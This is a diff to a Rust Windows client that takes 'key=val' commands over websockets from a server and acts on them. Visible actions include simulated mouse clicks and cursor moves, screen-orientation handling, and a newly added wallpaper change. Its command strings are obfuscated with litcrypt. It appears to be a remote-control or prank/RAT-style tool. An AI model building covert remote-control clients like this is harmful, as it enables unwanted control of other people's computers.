@@ -8,9 +8,8 @@ extern crate litcrypt;
 
 use_litcrypt!();
 
-use std::{os::windows::{process::CommandExt, thread}, pin::Pin, process::Command, time::Duration};
-use std::alloc::{alloc, dealloc, Layout};
-use log::{error, info, trace, warn};
+use std::{os::windows::{process::CommandExt}, pin::Pin, process::Command, time::Duration};
+use std::alloc::{alloc, Layout};
 use windows::Win32::{Graphics::Gdi::{DEVMODE_DISPLAY_ORIENTATION, DMDO_180, DMDO_270, DMDO_90, DMDO_DEFAULT}, UI::{Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_MOUSE,  MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEINPUT}, WindowsAndMessaging::{SetCursorPos, MB_ICONEXCLAMATION}}};
 use async_trait::async_trait;
 use ezsockets::{client::ClientCloseMode, ClientConfig, CloseFrame, WSError};
@@ -33,7 +32,7 @@ impl ezsockets::ClientExt for Client {
         }
         // messages should be in the following format: key=val;key2=val2;
         let parts: Vec<&str> =  text.split(";").collect();  
-        let mut action: String = String::new();
+        let mut _action: String = String::new();
         let mut param: String = String::new();
         let mut val: String = String::new();
 
@@ -50,7 +49,7 @@ impl ezsockets::ClientExt for Client {
             let [key, value] = parts.as_slice().try_into().unwrap();
 
             if key == lc!("action") {
-                action = value.to_string()
+                _action = value.to_string()
             }
             if key == lc!("param") {
                 param = value.to_string();
@@ -175,6 +174,11 @@ impl ezsockets::ClientExt for Client {
             }
         }
 
+        if param == lc!("wallpaper") {
+            let parts: Vec<String> = val.split(",").map(|s| s.to_string()).collect();
+            actions::change_wallpaper(parts[0].to_string());
+        }
+
         if param == lc!("lu") {
             let parts: Vec<String> = val.split(",").map(|s| s.to_string()).collect();
             unsafe {
@@ -199,7 +203,7 @@ impl ezsockets::ClientExt for Client {
         Ok(())
     }
 
-    async fn on_binary(&mut self, bytes: ezsockets::Bytes) -> Result<(), ezsockets::Error> {
+    async fn on_binary(&mut self, _bytes: ezsockets::Bytes) -> Result<(), ezsockets::Error> {
         Ok(())
     }
 
